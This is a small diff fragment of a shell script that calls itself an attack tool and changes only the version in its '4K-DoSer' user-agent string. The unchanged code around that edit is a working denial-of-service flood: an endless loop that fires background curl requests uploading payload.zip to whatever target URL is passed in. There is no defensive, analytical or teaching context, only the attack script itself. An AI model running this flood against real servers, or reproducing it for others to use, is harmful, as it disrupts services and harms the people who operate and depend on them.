@@ -13,6 +13,6 @@ echo 'Attacking' $1
 #Loop
 for (( ; ; ))
 do
-curl  -s --form "fileupload=@payload.zip" $1 -A '4K-DoSer/1.0 (DoSed by a Skid #TANGODOWN)' -o null > /dev/null 2>&1 &
+curl  -s --form "fileupload=@payload.zip" $1 -A '4K-DoSer/0.1 (DoSed by a Skid #TANGODOWN)' -o null > /dev/null 2>&1 &
 done
 echo 'Done'
